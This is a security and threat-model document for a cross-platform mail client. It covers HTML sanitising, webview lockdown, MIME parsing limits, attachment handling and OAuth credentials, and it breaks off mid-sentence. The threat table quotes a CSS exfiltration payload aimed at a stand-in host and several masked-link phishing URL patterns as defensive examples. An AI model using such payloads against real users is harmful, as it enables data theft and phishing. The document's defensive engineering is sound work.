# Security and threat model

Every byte that arrives over IMAP was written by someone else, possibly with
intent. This document lists what we defend against, how, and what we do not
defend against. Code that touches mail content must be reviewed against it.

## 1. Assets

- The user's mail content and metadata (confidentiality, integrity).
- Credentials: passwords, OAuth2 refresh/access tokens.
- The user's identity as a sender (no unauthorised sending).
- The local machine: no code execution, no file exfiltration.
- The user's privacy: no unrequested network requests triggered by mail.
  The one download a stored message can need, an attachment left on the
  mail server (a large one under `attachmentOfflineDays`, any under
  `neverStoreAttachments`, which also leaves there the pictures the HTML
  shows of 100 KiB and more, and where it is downloaded again whenever
  the daemon no longer holds it in memory, §8), comes from the account's
  own server, read-only, and only when the user opens, saves or forwards
  it, asks for the pictures of a message, replies to a message whose quote
  needs pictures kept there, or an MCP tool asks for that attachment or a
  forward (§10); showing a message never makes the daemon
  contact the server, and a picture left there is shown only once the
  user asked for it (§3.2).

## 2. Attackers

- **Mail sender**: anyone can send a crafted message. Full control over
  headers, MIME structure, bodies, attachment names.
- **Mail server / network**: a compromised or hostile IMAP/SMTP server, or an
  on-path attacker if TLS is misconfigured. Controls every protocol byte.
- **Local unprivileged process** (limited scope): another app in the same
  user session. Flatpak reduces, but does not remove, this.
- **Peer on the RPC socket**: a process that can connect to the daemon's
  socket but cannot read the key file beside it, or one that sits on the
  socket's path to pose as the daemon.

Out of scope: a compromised user account on the machine, a compromised OS,
physical access to an unlocked session, and endpoint malware.

What the connection handshake ([api.md §1.4](api.md#14-handshake), §8)
does about the local attackers:

| Attacker | What the handshake does |
|---|---|
| Reaches the socket but not the key file beside it: a `socat` or `ssh -R` forward, a container or a Flatpak app given the socket file alone (a bind mount or `--filesystem` grant of its directory exposes the key file as well); on Windows, where Go can neither set nor check a socket's permissions, a peer that reaches it that way | Keeps it out: without the key it cannot authenticate, and anything else closes the connection (a request gets error 1005 first); no backend code runs for it and no notification reaches it |
| Sits on the socket's path without the key | Gets no request: a client sends nothing after `system.hello` until the daemon has proved the key, so an `account.add` password never reaches it |
| Holds the key of an earlier run, or a recorded handshake | Gains nothing: every start makes a new key, every connection new nonces |
| Opens many connections | Bounded: before authentication 4 KiB and 10 s per connection and at most 32 at a time, which cannot stall authenticated clients; while it holds all 32, or floods the socket so that the system refuses connections, new clients cannot get in, and on Windows and macOS a daemon of another store starting meanwhile can take the socket over from the live one; one for the same store is stopped by the store lock (§8) |
| Relays between a client and the daemon, which takes write access to the socket's directory | Not detected: the proofs are not bound to the connection, and the traffic after them is neither encrypted nor protected against change |
| Can read the key file: runs as the user (a container or Flatpak app given the socket's directory included), or as administrator, root or SYSTEM | Nothing: it reads the key as it reads `store.db` and can use the whole API |

## 3. HTML mail

### 3.1 Threats

| Threat | Vector | Consequence |
|---|---|---|
| Script execution | `<script>`, `on*=`, `javascript:` URLs, SVG scripting, `<object>`/`<embed>` | full compromise of the rendering context |
| Tracking pixels | remote `<img>`, CSS `url()`, `@import`, `@font-face`, `<link>`, `srcset`, `<video poster>` | confirms address is live, leaks IP, time, client, sometimes read-receipts of forwarded mail |
| CSS exfiltration | attribute selectors + `url()` (`input[value^="a"] { background: url(https://x/a) }`), `@font-face` unicode-range | leak of page content character by character |
| Content spoofing / overlay | `position: fixed/absolute` overlays, z-index tricks, hidden text, `<form>` with our styling | phishing that looks like client UI |
| Masked links | link text ≠ href, IDN homographs, a bank's name in the userinfo (`https://bank.example@evil.example/`, and with a character one URL parser refuses there while the browser does not: `https:// bank.example@evil.example/`), a text that reads as the bank's address to a person but not to a parser (a soft hyphen, zero-width or bidi character in its host, a space around an inline element, a trailing dot, a homoglyph, a backslash or fullwidth slash before the path, a colon another script draws or none at all, `https//bank.example`, a dot another script draws, userinfo in the text), a text the view draws otherwise than the daemon lists it (CSS that hides or clips part of it, markup that draws it right to left, padding past the daemon's cap on the listed text), one href listed under two texts, or under two spellings of one address (an empty anchor, then the bank's), `data:` and `blob:` URLs | phishing |
| Frame / navigation | `<iframe>`, `<meta http-equiv=refresh>`, `<base href>` | loading arbitrary origins, rewriting relative links |
| Resource exhaustion | deeply nested tags, huge documents, billion-laughs-style entity tricks, giant images | UI hang, memory exhaustion |
| Mixed-content reference | `cid:` pointing to non-existent or foreign parts | confusion, occasional parser bugs |
| Allow-list spoofing | forged `From` matching a trusted address or display name | remote images load under the `knownSenders` policy for a message the trusted party never sent |

### 3.2 Defences

Layer 1 — **backend sanitiser** (`backend/internal/sanitize`), the primary
defence. Requirements are listed in that package's documentation; summary:

- parse to a tree (`golang.org/x/net/html` family), never regex the source;
  re-serialise from the tree;
- element allow-list (text formatting, lists, tables, images, links,
  `<div>/<span>`, basic structure); everything else dropped with children
  kept or dropped depending on the element;
- attribute allow-list per element; all `on*` removed; URL-valued attributes
  parsed and restricted (`http`, `https`, `mailto`, `cid`); anything else
  removed and counted;
- remote references removed under the default `block` policy. Under
  `allow`, `https:` images are fetched by the daemon (`internal/remoteimg`)
  and inlined as `data:` URIs, so the webview itself never makes a request:
  no cookies, no `Referer`, a fixed `User-Agent`, https only including
  redirects, the media type sniffed from the bytes (never trusted from the
  server, SVG never accepted), 2 MiB per image, 8 MiB and 32 images per
  message, 10 s in total; an image that fails to load is dropped and
  counted. A tracking pixel (at most 2 px wide or high, or hidden) is never
  fetched under any policy. `allow` comes either from an explicit
  per-call override or from the stored preference; the `knownSenders`
  preference is resolved to `allow`/`block` *before* the sanitiser runs
  (`internal/core`), so the sanitiser only ever sees the two-state decision
  and fails closed on anything else. The allow-list holds bare addresses the
  user sent mail to or approved explicitly, matched case-insensitively on
  the address only (never the display name), and every sender of a message
  must be on it. This does not defend against a forged `From` with a
  trusted *address*; DKIM/SPF-aware trust is future work, and the policy is
  off by default;
- CSS (both `<style>` and `style=""`) parsed and re-emitted through a
  property allow-list; `url()`, `expression()`, `@import`, `@font-face`,
  `position: fixed|absolute` (outside the message's own box), negative
  margins beyond bounds, and `content:` are removed;
- links: only `http(s)`/`mailto`; `target` removed; every link exported in
  `links[]` with its real `href` so the UI displays the destination;
  homograph-suspicious hosts flagged (later);
- `cid:` rewritten to `malachi-cid:<accountId>/<messageId>/<partId>` only
  for parts that exist, so the view's scheme handler is stateless and a
  message cannot name another message's parts (a `malachi-cid:` URL written
  by the mail itself is kept only when it names one of its own parts);
- every part the HTML references through `cid:` stays on the device
  whatever `attachmentOfflineDays` says (`mime.CIDReferences` collects a
  superset of what the sanitiser resolves, a property its tests and fuzz
  target check), and under `neverStoreAttachments` every such part smaller
  than 100 KiB; the exception is a picture of 100 KiB and more under
  `neverStoreAttachments`, whose `malachi-cid:` URL stays in the HTML
  while `message.body` counts it (`remotePictures`) and the user decides
  whether to download it. So the view's pictures come from the stored
  file or the daemon's memory: `message.part` never contacts the mail
  server, and a part kept there answers `partNotDownloaded`, never the
  empty body a skeleton holds in its place, unless `message.download`
  holds the whole message in memory (§8);
- size cap on input and output, nesting-depth cap, node-count cap,
  attribute-count cap, CSS rule cap;
- a `sanitizerVersion` string returned with every body; bump on any rule
  change so cached bodies are regenerated;
- **fail closed**: any parser error or cap breach withholds the HTML
  (`message.body` sets `htmlWithheld` and still serves the plain text;
  `draft.save` fails with `sanitizeFailed`). Sanitising the output again
  is the identity, which the fuzz target checks.

Layer 2 — **the UI webview** (WebKitGTK 6.0):

- JavaScript disabled in `WebKitSettings`; plugins, media, WebGL, WebAudio,
  local storage, databases, DNS prefetching and hyperlink auditing off;
- Content-Security-Policy `default-src 'none'; img-src malachi-cid: data:;
  style-src 'unsafe-inline'`, set both as the view's default policy and as
  a `<meta>` in the loaded document; `data:` covers only what the daemon
  inlined, the sanitiser removes a message's own `data:` URLs;
- a custom URI scheme handler serving `malachi-cid:` parts through
  `message.part` (images only, never SVG); network access for the view
  otherwise denied (an ephemeral `WebKitNetworkSession` pointed at an
  unreachable proxy, plus `decide-policy` denial of every navigation but
  the initial load);
- navigation intercepted: any link activation is cancelled, the destination
  displayed, and opened via the OpenURI portal on user confirmation;
- the view is a separate process (WebKit's process model) with a fresh
  ephemeral data manager per message;
- tested with the corpus in `backend/testdata/mime`.

Layer 2 exists so a sanitiser bug is not automatically a compromise; it is
not a reason to relax layer 1.

Layer 2 on macOS (`macos/Sources/MalachiMail/WebViews/MessageWebView.swift`,
[macos-port.md §5](macos-port.md#5-the-webkit-security-layer)) is re-established
for WKWebView, since nothing of the WebKitGTK configuration carries over:

- content JavaScript off (`allowsContentJavaScript = false`), no
  JavaScript-opened windows, a non-persistent data store, media only on
  user action, no link previews or magnification;
- the same Content-Security-Policy as a `<meta>` in the document
  (`viewerDocument`), which is the only carrier because a WKWebView has no
  default policy of its own; the document is always built from the
  sanitiser's output and loaded with `baseURL: nil`;
- `PartSchemeHandler` for `malachi-cid:` through `message.part`, images
  only, never SVG, stateless and cancelled with the request; network
  otherwise denied by a proxy nothing answers on (`127.0.0.1:1`) **and a
  content rule list** that blocks every load except `malachi-cid:`,
  `data:` and `about:blank`, since a `<link rel="preconnect">` opens a
  connection without a request that neither the CSP nor the proxy
  setting sees; no body is loaded before the list is installed, and none
  at all when it cannot be: the list is compiled once per process
  (`WebViews/ContentRules.swift`, the default store first, then a store
  in a temporary directory), a failure is never cached and is a fault in
  the log, and a view without the list drops the body and reports it, so
  the reader shows the plain text with the "could not be shown safely"
  hint instead, as for HTML the daemon withheld;
- navigation: only the initial `about:blank` load is allowed. A click on
  a link is taken by the view's own script before WebKit navigates: it
  cancels the click and reports the `href` attribute *as written*, which
  is the string the daemon lists in `links[]`, beside the URL WebKit
  resolved it to; the actions layer matches the attribute against the
  list exactly and confirms a masked link with its text and real target.
  WebKit's resolved URL (host lower-cased, IDN in punycode, a slash
  added) never compares equal to the list, so it is not what is matched.
  Stricter than GTK: an http(s) link the list does not hold, which is
  what a link activation reaching the navigation policy without a click
  amounts to, is confirmed with its destination shown, never opened
  silently. Every other navigation cancelled, no new windows, drops
  refused; the context menu keeps Copy and Copy Link only;
- the view's script and its message handlers live in a content world of
  their own (`WKContentWorld.defaultClient`), so nothing of the document
  could reach them even if content JavaScript were ever on;
- the plain-text body and the selectable header labels keep the system's
  text services out (a context menu of Copy and Select All only, no
  Services requestor, no Look Up preview), so a selection of mail text is
  never handed to another program by a path around the link handling;
- WebKit's separate content process; one view per pane, reused between
  messages with the document replaced whole.

Layer 2 on Windows (`windows/src/Malachi.App/WebViews`, the rules in
`Malachi.Core.Presentation`; [windows-port.md §6](windows-port.md#6-the-webview2-security-layer))
is re-established for WebView2, from measurements rather than
documentation, because WebView2 behaves unlike both WebKits: a cancelled
navigation still sends its request, and a CSP plus a request filter still
let `<link rel=preconnect>` open a connection and `<link rel=prerender>`
fetch a page, both unseen by the filter:

- no network at all: every view runs in one browser environment started
  with `--host-resolver-rules="MAP * ~NOTFOUND"`, which makes every name
  and every IP literal unreachable (WebView2's own background calls and
  SmartScreen included), and a proxy nothing answers on (`127.0.0.1:1`)
  as a second barrier; each view has an InPrivate profile, extensions and
  single sign-on with the Windows account are off, crash dumps (a dead
  renderer's memory holds the message it showed, or a draft) stay on the
  machine instead of going to Microsoft and are deleted when the app
  starts and when it quits, and the `WEBVIEW2_*` variables of the process
  are cleared first;
- script off in the viewer and the previewer (`IsScriptEnabled=false`:
  measured, no page listener, timer or message ever runs), no web
  messages, host objects, script dialogs, DevTools, status bar, browser
  keys, autofill or password saving, and no SmartScreen reputation check,
  which by default posts every clicked link to Microsoft;
- a request gate: every request of every kind is answered by the app
  (`WebResourceRequested`, never the network stack): the view's own
  document once, from `malachi-doc://` under a 128-bit nonce, with the
  same Content-Security-Policy as GTK as a header and as a `<meta>`,
  `nosniff`, `no-store` and `no-referrer`; its own picture scheme only
  (`malachi-cid:` through `message.part`, images only, never SVG, a type
  that is not `token/token` refused); 403 for everything else, the
  document a second time and `data:` included;
- navigation: only the pending document, once. A link activation is
  cancelled; a host script reads the focused link through the
  prototypes' own accessors, which a named element of the page cannot
  shadow, and its `href` as written counts only when it resolves to
  exactly the navigation's URL; the reader then opens the link, confirms
  it (a masked link with its text and real target; a link the daemon did
  not list, or one known only by the URL WebView2 normalised, with its
  destination) or composes for `mailto:`. Stricter than GTK, which reads
  the href with Go's parser alone: under a text that names a host, a link
  is masked when that parser cannot tell its host, finds none, or finds
  userinfo, and a listed link opens without the question only when the
  address the browser will get has its host on the text's site; that
  address never carries userinfo, so the question names the real host
  first. Every listed link with the clicked href is judged, not the
  first, since a click cannot tell two anchors with one href apart, and
  so is every listed link whose canonical form is the navigation's
  (hrefs that differ only in case, a default port or escaping). The
  text judged is the daemon's `links[].text`, which is not what the view
  draws: the anchor's text nodes and image alts, joined with a space each
  and cut at 200 runes. The client takes out of it what is invisible
  (format and other default-ignorable characters), reads it in NFKC with
  the ideographic full stop as a dot, compares hosts in punycode without
  a trailing dot, and counts every address in it: a scheme with its colon
  (or one another script draws) and a slash, http and https without one,
  `www.`, and two slashes wherever they stand, after a letter too
  (`https//bank.example`, and `…//:sptth`, an address markup draws right
  to left); a start of an address the daemon's spaces split (`w ww.`,
  `https :/ /`) is read without them. In a text that begins with an
  address, a space ends the host unless the host visibly goes on after it
  (the next word begins with a dot that begins no ellipsis, has one
  before its first slash or ends with one, or the word before the space
  ends with one; two dots in a row end a host):
  `www.shop.example for details` names www.shop.example,
  `https://moje banka.example/login` no host that can be read. An
  address whose host cannot be read
  (a space inside it, userinfo, an escape) names a host no link leads to,
  so it is asked about. A text that holds no address is read as a host
  whole, as in GTK (after a word and a colon, what follows the colon), and
  one word with a dot another script draws between its labels or more
  than one dot at its end names a host that cannot be read. A
  single-label host (a top-level domain, an intranet name) is no site of
  the hosts under it; multi-label public suffixes such as `co.uk` are not
  known without a public-suffix list, so `https://co.uk/` still counts as
  the site of a text that names `bank.co.uk`. What the client cannot see
  still opens without the question, as known limits that need the daemon
  to report what the view draws: part of the link's text that CSS hides
  or clips (a hidden word before a bare host, a clipped address before
  the one shown, padding that pushes the shown address past the 200-rune
  cap), a bare host with a path that markup draws right to left
  (`<bdo dir=rtl>`, `unicode-bidi: bidi-override`), a host an inline
  element splits right after a host of the link's own site (drawn as
  `https://evil.examplebank.example`) or in its last label (drawn as
  `https://www.bank.com` over a link to `www.bank.co`), one word whose
  labels a middle or raised dot parts (left out for Catalan, Japanese
  and the scripts that write such dots between syllables), and a host without a
  scheme or `www.` after words (`Log in at bank.example`), which GTK does
  not read either; an e-mail address names no host. A link the launcher
  refuses is never offered and says so in a toast
  ([windows-port.md §6.4](windows-port.md#64-links)).
  New windows, downloads, external schemes, frames, permissions,
  authentication, client certificates, certificate errors, screen capture
  and Save As are refused; the context menu keeps Copy and Copy Link;
- a fixed document title: WebView2 draws a view through a top-level
  window of the browser process titled after the document, which other
  programs can read, so no message, picture or PDF names that window;
- a renderer that dies or hangs gets the same document once more, and
  when it fails again the view drops it (the reader shows the plain text
  with the "could not be shown safely" hint), so a body that reliably
  crashes Chromium or PDFium cannot loop, writing a crash dump of the
  mail each time and giving an exploit unlimited retries; a runtime that
  is missing, or cannot take one of these settings, loads nothing, fail
  closed;
- attachments are previewed by the app's own previewer in such a view,
  never by the shell's preview handlers (third-party code in process over
  hostile files): pictures by their signature, never SVG; PDF in the
  runtime's viewer inside a page of the app's own; text, HTML, SVG, XML
  and messages as escaped source; nothing written to disk, no link
  followed;
- the **network canary** (`Malachi.App.Canary`, part of `make
  test-windows`) runs the real viewer, editor and previewer against a
  hostile document, its active twin (hover, clicks, forms, a refresh) and
  every HTML part of `backend/testdata/mime` raw, without the sanitiser,
  with a loopback listener per vector and Chromium's NetLog: no listener
  reached, no name resolved, no TCP connection attempted, no URL request
  but WebView2's own, nothing navigated, opened or downloaded; a control
  run without the protections must leak, so the harness is known to see
  leaks.

### 3.3 Composed HTML

HTML written in the compose editor is hostile too: a paste from a web page
carries tracking pixels, scripts, hidden text and forms. It crosses the
local socket raw, but the backend sanitises it in `draft.save` (compose
mode: fixed `block` policy, `data:` URLs removed, `cid:` only to the
draft's own inline attachments) before anything is stored, listed or sent;
`blocked` in the result tells the UI what was removed. A quoted original
(reply, forward) never reaches the editor raw either: `draft.create`
sanitises it in the backend, in the same compose mode, and copies its
inline pictures into the attachment store under ids of the backend's own
choosing, so the quote references nothing of the received message. The
UI editor itself renders only what the user typed, backend-returned draft
HTML and escaped fallback quotes, under the layer-2 rules: no page
JavaScript, a CSP without network access, navigation denied, and a `cid:`
handler that serves only ids the window registered — files the user
picked, and the backend's copies fetched through `attachment.get`, which
are served only when they are pictures (never SVG) within the cap. The
macOS editor (`WebViews/ComposeWebView.swift`, `CIDSchemeHandler.swift`)
keeps the same rules on WKWebView: content JavaScript off with the
bridge as a user script in a content world of its own (`window.malachi`
and its message handler do not exist in the page's world), the same CSP
`<meta>`, the proxy and a content rule list that allows only `cid:` and
`data:` pictures and without which no document is loaded (the editor
then reports a failure and the compose window shows its editor-failure
toast; the text it was given stays saveable), every navigation after the
initial load cancelled, no context menu, dropped files taken away from
WebKit and handed to attachment import so a `file:` URL never reaches
the page. The Windows editor (`WebViews/ComposeWebView.cs`) needs page
script on, since with script off not even an injected bridge's listener
runs, and WebView2 has no content world of its own: the bridge shares the
page's world. The CSP carries no `script-src`, so every script, handler
and `javascript:` URL of pasted or quoted HTML is blocked while the
bridge, injected before the first navigation and bound to the top frame
and the document's URL, uses the `Document` and `EventTarget` accessors
it captured at document start (a pasted `<img name="body">` cannot
clobber them). Its messages are accepted only as strings from the current
document in a shape that parses; the request gate, the resolver rule and
the dead proxy keep it offline as the viewer; its `cid:` serves only ids
the window registered, as on the other platforms; every navigation but
its own document is cancelled; a drop of files reaches the host as paths
for `attachment.import`, never the page; its context menu keeps only the
editing commands. The canary loads its hostile document and the corpus
into it as well.

## 4. Message parsing (MIME)

- Parsers assume malformed input: missing boundaries, wrong `Content-Length`,
  8-bit in 7-bit parts, nested `message/rfc822` bombs, hundreds of
  alternative parts, invalid charsets, header injection with bare CR/LF.
- Caps on: part count, nesting depth, header count and size, decoded size.
  `internal/mime` enforces 500 parts, nesting depth 20, a 256 KiB header
  block and 1 MiB of extracted text per message; the syncer refuses raw
  messages over its own cap before they are downloaded (`bodyState:
  "tooBig"`). A message that breaks a cap is `failed`, never partially
  trusted.
- Raw RFC 822 messages are stored as received, zstd-compressed
  (`compressStore`), or as a verified skeleton whose large attachments
  stayed on the server (below), as `0600` files in a `0700` per-account
  directory under `<data dir>/messages/` (§8), and are removed with their
  folder or account. They are input for later parsing, never served.
- The skeleton rewriter (`mime.Skeleton`, used by `internal/ingest`) is a
  second reader of hostile input, so it mirrors the reading splitter
  rather than trusting its own: the same go-message readers, limits and
  part numbering as `mime.Parse`, every header as that parser reads it, the
  kept leaves copied byte for byte, the delimiter lines written by hand
  with the original boundaries, and a refusal wherever the split is in
  doubt (a missing or over-long boundary, any reader error, a limit, a
  header or first body line that would read as an enclosing delimiter once
  its line ending became CRLF). Its output is only a candidate: it is
  parsed again, and `mime.VerifySkeleton` must find the same envelope,
  headers, bodies, snippet, part numbers and attachment list as the
  original's parse, every size equal but the omitted parts', which must be
  empty; anything else keeps the original whole. Only attachments that
  the HTML does not reference through `cid:` (of at least 100 KiB, of any
  size under `neverStoreAttachments`) and, under `neverStoreAttachments`,
  pictures it references of at least 100 KiB are ever left out, and a
  signed or encrypted message (`multipart/signed`,
  `multipart/encrypted`, `application/(x-)pkcs7-mime`,
  `application/pgp-encrypted` anywhere in it) never is: a signature covers
  the parts as they are. `FuzzSkeleton` and `FuzzCIDReferences` cover it,
  with pathological samples (`testdata/mime/skeleton-*`).
- A download is checked, not trusted: an IMAP literal shorter than the size
  the server announced, or a Graph body that breaks off, is a network error
  and nothing of it is stored as a message; a message downloaded again
  (`message.download`) must be the stored one (the same Message-ID, and on
  IMAP the same part numbers and sizes) or nothing is stored, nor held in
  memory (§8).
- `messages.text_body` (what `message.body` returns as `text`) is derived
  text only: the decoded `text/plain` part, or for HTML-only messages a
  text rendering produced by walking the HTML *tokens*
  (`golang.org/x/net/html` tokenizer, text nodes only; scripts and styles
  skipped). No tag, attribute or entity reaches that column, and no HTML is
  cached anywhere: the sanitiser will work from the raw file.
- Attachment filenames are sanitised (no `/`, `\`, control chars, bidi
  controls such as U+202E that would make the displayed extension lie,
  leading dots, over-long names) and shown with their detected type, not
  only the claimed one. A click on an attachment previews it: GNOME's
  Sushi (`org.gnome.NautilusPreviewer`, `ui/internal/preview`) or Quick
  Look on macOS, which render the file and never run it; opening it in the
  default application is a separate item in the chip's menu. Where Sushi
  is missing the click opens the file the same way, except an executable.
  Executable types are previewed but never opened directly: Open stays
  disabled for them and "Save As" is offered, judged by the last extension
  and the claimed content type, and in the GTK UI again by the name and
  type `message.part` served (`ui/internal/window/attachments.go`). The macOS
  client adds what that platform runs, installs or follows on a double
  click (Terminal scripts, `.app`, `.pkg`, configuration profiles, Java
  Web Start, AppleScript and Automator documents, bundles, `.webloc` and
  the other location files, Mach-O and installer media types;
  `MalachiCore/Model/AttachmentChips.swift`) and asks the type system
  whether the claimed name or type conforms to an executable, script,
  application, bundle or package (`Attachments/AttachmentActions.swift`);
  the check runs on what the message lists before the fetch and again
  on the name and type `message.part` served, which are what the file
  gets. The client repeats the name sanitiser on every name it writes
  (`safeFileName`: last path component, no control or bidi characters,
  no leading dots, 255 bytes, and `:` to `_`). The Windows client
  previews in its own locked-down previewer (§3.2) and never opens what
  Windows runs, installs or mounts: besides the GTK list and the macOS
  additions, Outlook's Level-1 list, `.rdp`, `.appinstaller`, `.msix`,
  `.ppkg`, `.searchconnector-ms` and friends, disk images (`.iso`,
  `.img`, `.vhd`, `.vhdx`, whose mounting has bypassed the Mark of the
  Web), OneNote's `.one` and `.onepkg`, Windows Contacts' `.contact` and
  `.wab`, Access's formats since 2007 (`.accdb`, `.accde`, `.accdr`,
  `.accda`, `.accdu`, `.accdt`, `.accdc`, the successors of the Access
  types Outlook's list names, and the web app reference `.accdw`), and
  anything the shell's
  `AssocIsDangerous` or the attachment policy flags
  (`Malachi.Core.Platform.DangerousTypes`, `FileTypePolicy`), judged on
  the listed, the served and the written name. Its Save All leaves these
  types out, unlike GTK and macOS: Explorer parses a shortcut
  (`.url`, `.lnk`), `.scf`, `.library-ms` or `.searchConnector-ms` file
  for its icon and location as soon as its folder is shown, whatever its
  Mark of the Web, and has sent the user's NTLM hash to another host that
  way (CVE-2025-24054); a toast says how many were left out, and Save As
  saves one on the user's explicit choice. It writes names
  that are safe on Windows (reserved characters and their ANSI best-fit
  look-alikes, device names, trailing dots and spaces, streams, the path
  length, a cut to length never adding an extension), and opens only
  local files through the shell, never a share, a link or a stream.
- An attached message (`message/rfc822`, or a part named `.eml`) is never
  parsed during sync. `message.embedded` renders it only when the user
  opens it, from the part's bytes, through the same parser, limits and
  sanitiser as any body; its `cid:` pictures are inlined under the
  remote-image caps with their type sniffed from the bytes, the parser does
  not recurse into a message attached to it, its other parts are named but
  cannot be fetched, and nothing about it is stored. The remote-content
  policy is resolved for the containing message's sender, not for the
  forwarded `From`.
- Charset decoding is best-effort with replacement characters; never a
  crash, never a hang.
- Every new parser gets pathological samples in `testdata/mime` and a fuzz
  target.
- `Message-ID`, `In-Reply-To` and `References` only ever link
  conversations (architecture §3.4): matched exactly, never used as an
  identity, capped at 50 references per message (repeats count once), 512
  rows per lookup and 500 members per merge, and never grouped by subject.
  A message that forges a thousand identifiers of other people's mail
  reaches at most one 500-member group; it cannot fold a mailbox into one
  thread, and a Graph conversation is never rewritten by a local message.
- Attachment import (`attachment.import`) treats the path from the UI as
  input, not as trust: it must be absolute and name a regular file after
  following symlinks; it is opened `O_NONBLOCK` so a FIFO or device cannot
  hang the daemon; the size cap is checked at stat time *and* enforced
  during the copy; the content type is sniffed, never taken from the client
  or the extension alone; the file name goes through the same sanitiser
  (`internal/safename`) as received names.
- Display names and subjects are the sender's text, shown as plain text by
  every client. Unicode lets such text reorder what is drawn after it:
  U+202E (RIGHT-TO-LEFT OVERRIDE) in a `From` name turns the `<address>`
  that follows it around in a tooltip, and in a subject draws `gnp.exe`
  as `exe.png`; a control character is invalid in the XML of a Windows
  toast, which then does not appear at all. The Windows client therefore
  cleans every mail text its chrome shows before showing it
  (`Malachi.Core.Text.DisplayText`): the list's senders and subjects, the
  reader's subject and address chips, the captions of message windows,
  notifications, the questions that quote a subject or a link's text,
  attachment names and recipient suggestions, and the names the server
  gives its folders (the sidebar, the list's header, the main window's
  caption, the origin of a search result, the status line). The explicit
  bidi formatting characters (U+202A to U+202E, U+2066 to U+2069) are
  removed; control characters (C0, DEL, C1) and the line and paragraph
  separators become spaces, so what is left is valid XML; and where such
  text is composed with other text (*Name &lt;address&gt;*, a
  conversation's participants, a sentence that quotes a subject or a
  folder, the masked-link question that quotes a link's text before its
  real destination, *Folder – Malachi Mail*) it is isolated between
  U+2068 and U+2069, so a right-to-left text keeps its own direction and
  cannot move what follows it. The bidi marks (U+200E, U+200F, U+061C)
  and the joiners stay, so Hebrew, Arabic and Persian names read as
  written; a subject or name of nothing but characters that draw nothing
  (such a mark, U+200B, U+FEFF) counts as empty and shows its fallback,
  *(No subject)* or the address. This is display only: the recipients of
  a reply, a draft's subject, the names in a quote's header and what Copy
  Address copies are the text as received, and a message's body and the
  excerpt of it in the list are its content, shown as written. So the
  composer's To and Subject fields of a reply show the received name and
  subject as they will be sent, an override included: cleaning them would
  change the message, which is the daemon's to do in `draft.create`. The
  GTK and macOS clients show these texts as received; the same rule is
  proposed for them, and that cleaning for `draft.create`
  ([windows-port.md §14](windows-port.md#14-backend-and-repository-changes)).

## 5. Signatures and encryption (EFAIL and friends)

Not implemented in phase 1. When PGP/S/MIME arrives:

- Decrypt/verify only in the backend; the UI sees a verdict and sanitised
  content.
- **EFAIL direct-exfiltration**: never render a message where encrypted
  and unencrypted MIME parts are mixed into one HTML document. Each
  encrypted part is rendered alone, and remote content is *always* blocked
  in decrypted content regardless of the user's `allow` policy.
- **EFAIL malleability gadgets**: require MDC/AEAD for OpenPGP; refuse to
  show content whose integrity check failed, no "show anyway" button.
- Signature verdicts are displayed with the signer's *verified* identity, not
  the `From` header text; a valid signature by the wrong key is shown as a
  warning, not a checkmark.

## 6. Credentials

- Passwords and OAuth2 refresh tokens go to the system keyring through
  `org.freedesktop.secrets` (libsecret). **Never** to `config.toml`, the
  SQLite store, logs, or crash reports.
- Access tokens are held in memory only.
- Microsoft 365 accounts (`kind: graph`) with `graph.source: goa` have no
  secret of their own: the sign-in and the refresh token live in GNOME
  Online Accounts, and the daemon asks `org.gnome.OnlineAccounts`
  (`internal/auth/goa`) for access tokens over the session bus, the same
  trust domain as the Secret Service below. With `graph.source: daemon`
  (the backend's own sign-in, below) the account keeps a refresh token in
  the keyring like any other `daemon` account. A token is cached in memory until shortly before the expiry GOA
  reports, dropped when the service rejects it, and scrubbed from any error
  text the service echoes. Revoking the sign-in in GNOME Settings cuts the
  daemon off at the next token request.
- Google accounts (`oauth2` endpoints with `source: goa`) take the same
  route with a token scoped for IMAP/SMTP: the daemon presents it through
  SASL XOAUTH2 (`internal/auth`). Inside the sync engine and the outbox
  the token travels in the parameter the password would, so the same
  redaction scrubs it from error text, and a server refusing it drops it
  from the cache at once (`AuthFailed` hooks) so the next attempt asks
  GNOME Online Accounts again.
- The backend's own OAuth2 sign-in (`source: daemon`,
  `internal/auth/oauth2flow`) serves Gmail and Microsoft 365 where GNOME
  Online Accounts does not run (macOS, KDE, …) or does not hold the
  address. It is the authorization-code flow with PKCE (S256, a fresh
  verifier per session) and a 32-byte random `state` compared in constant
  time. Each session (`account.oauthStart`) opens its own listener on
  `127.0.0.1` on an ephemeral port (the redirect is
  `http://127.0.0.1:<port>/`, a loopback literal, never `localhost`) that
  answers `GET /` only, with header/read/write timeouts, 16 KiB of
  headers, no keep-alive, a closing connection and at most 4 connections
  served at once (more wait in the accept queue); every other path or
  method is a 404. A request whose `Host` is not exactly
  `127.0.0.1:<port>` (DNS rebinding: a page on a name that resolves to
  the loopback address) is refused before anything is looked at. The
  first request with the expected `state` closes the listener (one
  callback, nothing after it); requests with a wrong or missing `state`
  get a 400 and change nothing, so a stray or forged request cannot end
  the session the browser is about to complete. A session lives
  10 minutes, at most 8 run at once, and the backend closes all of them
  on shutdown. The UI opens the authorisation URL — the GTK UI through
  `gtk.URILauncher` (the OpenURI portal inside Flatpak, the desktop's
  default handler otherwise), the macOS UI through `NSWorkspace`, the
  Windows UI through `ShellExecuteEx` (https only); the backend never
  launches a browser.
- The code goes to the provider's token endpoint through a hardened
  client: TLS 1.2+ with the system trust store (the transport policy),
  30 s per request, no redirects followed, no keep-alive. Before anything
  is kept, the signed-in mailbox must be the account's address (trimmed,
  case-insensitive). Google's is the `email` of the ID token: issuer and
  audience are checked (with an array audience, `azp` must be the client
  id too, and a present `azp` always must), `exp` against the clock with
  two minutes of leeway, and `email_verified` must be present and true;
  the token came straight from the token endpoint over TLS, so its
  signature need not be. Microsoft's is Graph `/me` read with the new
  access token — `mail`, else `userPrincipalName` — which the tenant's
  administrators control rather than a verified-address claim; that is
  acceptable because the user performs the sign-in in their own browser,
  so the identity only guards against signing in to the wrong mailbox by
  mistake. An identity with control or Unicode format characters (bidi
  overrides, zero-width characters) is refused, not repaired. Another
  mailbox fails the session (`invalidArgument` with `signedInAs`); its
  tokens are dropped from memory, not revoked at the provider.
- A completed session is bound to what it was started for. Its grant
  records the client (id and Microsoft tenant) the tokens were issued to;
  `credentials.oauthSession` is accepted only for an account whose
  address is the verified mailbox (a grant naming no mailbox never is),
  with the same provider and the client the account resolves to now, and
  a re-sign-in session (`account.oauthStart {accountId}`) only by
  `account.update` / `account.test` of that account. A pending re-sign-in
  is handed out again only while it is for the account's current
  provider, client and address; otherwise it is cancelled and a new one
  opened. `account.oauthCancel` on a completed session discards it and
